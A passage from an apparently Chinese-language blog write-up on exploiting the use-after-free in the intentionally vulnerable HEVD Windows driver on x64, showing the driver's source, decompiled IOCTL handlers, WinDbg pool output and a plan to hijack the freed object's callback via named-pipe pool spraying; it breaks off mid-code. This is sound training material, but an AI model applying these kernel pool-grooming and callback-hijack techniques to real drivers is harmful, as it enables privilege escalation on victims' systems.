+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, g_UseAfterFreeObjectNonPagedPool<span style="color:#ff79c6">-&gt;</span>Callback);
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Calling Callback</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (g_UseAfterFreeObjectNonPagedPool<span style="color:#ff79c6">-&gt;</span>Callback)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                g_UseAfterFreeObjectNonPagedPool<span style="color:#ff79c6">-&gt;</span>Callback();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Status <span style="color:#ff79c6">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        Status <span style="color:#ff79c6">=</span> GetExceptionCode();
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[-] Exception Code: 0x%X</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> Status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="漏洞利用">漏洞利用</h2>
+<p>两个版本</p>
+<ul>
+<li>NonPagedPool 这个池的内容是可以执行的</li>
+<li>一个是 <code>Nx</code> 版本，也就是不可执行版本。</li>
+</ul>
+<p>g_UseAfterFreeObjectNonPagedPool 初始化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">AllocateUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span>    VOID
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    NTSTATUS Status <span style="color:#ff79c6">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span>    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PAGED_CODE();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__try</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[+] Allocating UaF Object</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// Allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        UseAfterFree <span style="color:#ff79c6">=</span> (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
+</span></span><span style="display:flex;"><span>            NonPagedPool,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),
+</span></span><span style="display:flex;"><span>            (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>UseAfterFree)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// Unable to allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[-] Unable to allocate Pool chunk</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Status <span style="color:#ff79c6">=</span> STATUS_NO_MEMORY;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> Status;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Tag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, STRINGIFY(POOL_TAG));
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Type: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, STRINGIFY(NonPagedPool));
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#ff79c6">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>            DbgPrint(<span style="color:#f1fa8c">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UseAfterFree);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// Fill the buffer with ASCII &#39;A&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        RtlFillMemory((PVOID)UseAfterFree<span style="color:#ff79c6">-&gt;</span>Buffer, <span style="color:#ff79c6">sizeof</span>(UseAfterFree<span style="color:#ff79c6">-&gt;</span>Buffer), <span style="color:#bd93f9">0x41</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// Null terminate the char buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        UseAfterFree<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#ff79c6">sizeof</span>(UseAfterFree<span style="color:#ff79c6">-&gt;</span>Buffer) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// Set the object Callback function
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        UseAfterFree<span style="color:#ff79c6">-&gt;</span>Callback <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>UaFObjectCallbackNonPagedPool;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// Assign the address of UseAfterFree to a global variable
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>        g_UseAfterFreeObjectNonPagedPool <span style="color:#ff79c6">=</span> UseAfterFree;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[+] UseAfterFree Object: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UseAfterFree);
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[+] UseAfterFree-&gt;Callback: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UseAfterFree<span style="color:#ff79c6">-&gt;</span>Callback);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        Status <span style="color:#ff79c6">=</span> GetExceptionCode();
+</span></span><span style="display:flex;"><span>        DbgPrint(<span style="color:#f1fa8c">&#34;[-] Exception Code: 0x%X</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> Status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>UAF结构体</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_USE_AFTER_FREE_NON_PAGED_POOL</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FunctionPointer Callback;
+</span></span><span style="display:flex;"><span>    CHAR Buffer[<span style="color:#bd93f9">0x54</span>];
+</span></span><span style="display:flex;"><span>} USE_AFTER_FREE_NON_PAGED_POOL, <span style="color:#ff79c6">*</span>PUSE_AFTER_FREE_NON_PAGED_POOL;
+</span></span></code></pre></div><p>寻找IoctlCode：反编译</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222013</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_64;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222017</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> UseUaFObjectNonPagedPoolIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_64;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x22201B</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> FreeUaFObjectNonPagedPoolIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span></code></pre></div><p>NonPagedPool，其alloc的大小为0x60</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PoolWithTag <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>)ExAllocatePoolWithTag(NonPagedPool, <span style="color:#bd93f9">0x60u</span>i64, <span style="color:#bd93f9">0x6B636148u</span>);
+</span></span></code></pre></div><p>思路：UAF劫持callback函数，让其执行提权的代码。</p>
+<h3 id="exploit-nonpagedpool">Exploit NonPagedPool</h3>
+<p>加载驱动，查看是否加载成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; lm m H*
+</span></span></code></pre></div><p>打断点和显示DbgPrint信息</p>
+<ul>
+<li><code>DebugBreak()</code> 应用程序触发kenel debug断点</li>
+</ul>
+<p>打印出所有的信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF
+</span></span></code></pre></div><p>因为存在 <code>Tag</code> 可以寻找pool，比较花时间，可以在DebugView里寻找信息.<code>!poolfind</code> 命令不会计算头部，<code>!pool</code> 会计算</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; !poolused 2 Hack
+</span></span><span style="display:flex;"><span>0: kd&gt; !poolfind Hack -nonpaged
+</span></span><span style="display:flex;"><span>3: kd&gt; g
+</span></span><span style="display:flex;"><span>***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******
+</span></span><span style="display:flex;"><span>[+] Allocating UaF Object
+</span></span><span style="display:flex;"><span>[+] Pool Tag: &#39;kcaH&#39;
+</span></span><span style="display:flex;"><span>[+] Pool Type: NonPagedPool
+</span></span><span style="display:flex;"><span>[+] Pool Size: 0x60
+</span></span><span style="display:flex;"><span>[+] Pool Chunk: 0xFFFFA78BEF702B50
+</span></span><span style="display:flex;"><span>[+] UseAfterFree Object: 0xFFFFA78BEF702B50
+</span></span><span style="display:flex;"><span>[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50
+</span></span><span style="display:flex;"><span>[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0
+</span></span><span style="display:flex;"><span>****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******
+</span></span><span style="display:flex;"><span>Break instruction exception - code 80000003 (first chance)
+</span></span><span style="display:flex;"><span>0033:00007ff9`b21bb6d2 cc              int     3
+</span></span><span style="display:flex;"><span>1: kd&gt; !pool 0xFFFFA78BEF702B50
+</span></span><span style="display:flex;"><span>Pool page ffffa78bef702b50 region is Nonpaged pool
+</span></span><span style="display:flex;"><span> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....
+</span></span><span style="display:flex;"><span> # ...
+</span></span><span style="display:flex;"><span> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim
+</span></span></code></pre></div><p>查看内存信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1: kd&gt; dq 0xFFFFA78BEF702B50
+</span></span><span style="display:flex;"><span>ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702b60  41414141`41414141 41414141`41414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702b70  41414141`41414141 41414141`41414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702b80  41414141`41414141 41414141`41414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702b90  41414141`41414141 41414141`41414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702ba0  41414141`41414141 00000000`00414141
+</span></span><span style="display:flex;"><span>ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039
+</span></span></code></pre></div><p>pool 实际大小，需要加入一个头部信息，并且内存对齐。pool header</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim
+</span></span><span style="display:flex;"><span> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1: kd&gt; !poolused 2 Hack
+</span></span><span style="display:flex;"><span>Using a machine size of 1ffe7e pages to configure the kd cache
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span> Sorting by NonPaged Pool Consumed
+</span></span><span style="display:flex;"><span>               NonPaged                  Paged
+</span></span><span style="display:flex;"><span> Tag     Allocs         Used     Allocs         Used
+</span></span><span style="display:flex;"><span> Hack         1          112          0            0	UNKNOWN pooltag &#39;Hack&#39;, please update pooltag.txt
+</span></span><span style="display:flex;"><span>TOTAL         1          112          0            0
+</span></span></code></pre></div><p>因此实际获得的大小：0x70，内存对齐</p>
+<p>内核池喷射是一项使池中分配位置可预测的艺术。这意味着你可以知道一个块将被分配到哪里，哪些块在其附近。</p>
+<ul>
+<li>微软有一个<a href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects">内核对象 - Win32 apps</a>列表，我们可以通过调用用户模式功能来创建内核对象，</li>
+</ul>
+<p>触发UAF前，需要使用 heap fengshui</p>
+<ul>
+<li>可以不布局，看来几篇文章，直接利用 <a href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li>
+<li><code>NtAllocateReserveObject</code> 布局，但是在x64下得到错误的</li>
+<li>x64下可以使用<code>CreatePipe</code>和<code>WriteFile</code>来进行NonPagedPool喷射，缓冲区大小：PoolSize-HeaderSize(0x48)，NpFr tag。<a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation – HEVD x64 Use-After-Free • Vulndev</a>)</li>
+</ul>
+<p>free后被合并，因此为了提高成功率，就创建hole，然后使用漏洞对象进行占位</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~
+</span></span></code></pre></div><p>参考<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a>，获得两个句柄 <code>0xac, 0xb0</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0: kd&gt; !poolused 2 NpFr
+</span></span><span style="display:flex;"><span>Using a machine size of 1ffe7e pages to configure the kd cache
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> Sorting by NonPaged Pool Consumed
+</span></span><span style="display:flex;"><span>               NonPaged                  Paged
+</span></span><span style="display:flex;"><span> Tag     Allocs         Used     Allocs         Used
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> NpFr         1          112          0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TOTAL         1          112          0            0
+</span></span></code></pre></div><p>写入UAF，存在一个FAKE_OBJECT，可以进行写入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x22201F</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_64;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> AllocateFakeObjectNonPagedPoolIoctlHandler(_IRP <span style="color:#ff79c6">*</span>Irp, _IO_STACK_LOCATION <span style="color:#ff79c6">*</span>IrpSp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _NAMED_PIPE_CREATE_PARAMETERS <span style="color:#ff79c6">*</span>Parameters; <span style="color:#6272a4">// rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> result; <span style="color:#6272a4">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  Parameters <span style="color:#ff79c6">=</span> IrpSp<span style="color:#ff79c6">-&gt;</span>Parameters.CreatePipe.Parameters;
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC0000001</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( Parameters )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> AllocateFakeObjectNonPagedPool((_FAKE_OBJECT_NON_PAGED_POOL <span style="color:#ff79c6">*</span>)Parameters);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> AllocateFakeObjectNonPagedPool(_FAKE_OBJECT_NON_PAGED_POOL <span style="color:#ff79c6">*</span>UserFakeObject)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _OWORD <span style="color:#ff79c6">*</span>PoolWithTag; <span style="color:#6272a4">// rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Creating Fake Object</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  PoolWithTag <span style="color:#ff79c6">=</span> ExAllocatePoolWithTag(NonPagedPool, <span style="color:#bd93f9">0x5Cu</span>i64, <span style="color:#bd93f9">0x6B636148u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( PoolWithTag )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Pool Tag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">&#34;&#39;kcaH&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Pool Type: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">&#34;NonPagedPool&#34;</span>);
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Pool Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x5Cu</span>i64);
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, PoolWithTag);
+</span></span><span style="display:flex;"><span>    ProbeForRead(UserFakeObject, <span style="color:#bd93f9">0x5Cu</span>i64, <span style="color:#bd93f9">1u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>PoolWithTag <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer;
+</span></span><span style="display:flex;"><span>    PoolWithTag[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">16</span>];
+</span></span><span style="display:flex;"><span>    PoolWithTag[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">32</span>];
+</span></span><span style="display:flex;"><span>    PoolWithTag[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">48</span>];
